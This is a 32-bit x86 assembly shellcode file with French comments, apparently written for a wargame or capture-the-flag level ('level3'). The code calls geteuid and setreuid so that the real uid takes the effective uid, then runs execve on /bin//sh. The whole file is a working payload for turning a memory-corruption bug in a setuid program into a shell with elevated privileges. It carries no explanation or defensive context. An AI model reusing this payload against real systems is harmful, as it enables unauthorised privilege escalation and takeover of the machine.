BITS 32

; geteuid() -> eax = uid effectif (level3)
xor  eax, eax
mov  al, 0x31
int  0x80

; setreuid(euid, euid) -> uid reel = uid effectif
mov  ebx, eax
mov  ecx, eax
xor  eax, eax
mov  al, 0x46
int  0x80

; execve("/bin//sh", {"/bin//sh", NULL}, NULL)
xor  eax, eax
push eax                ; octet nul final de la chaine
push 0x68732f2f         ; "//sh"
push 0x6e69622f         ; "/bin"
mov  ebx, esp           ; ebx -> "/bin//sh"
push eax                ; NULL (fin de argv)
push ebx                ; pointeur vers "/bin//sh"
mov  ecx, esp           ; ecx -> argv = {"/bin//sh", NULL}
mov  edx, eax           ; edx = NULL (envp)
mov  al, 0x0b
int  0x80
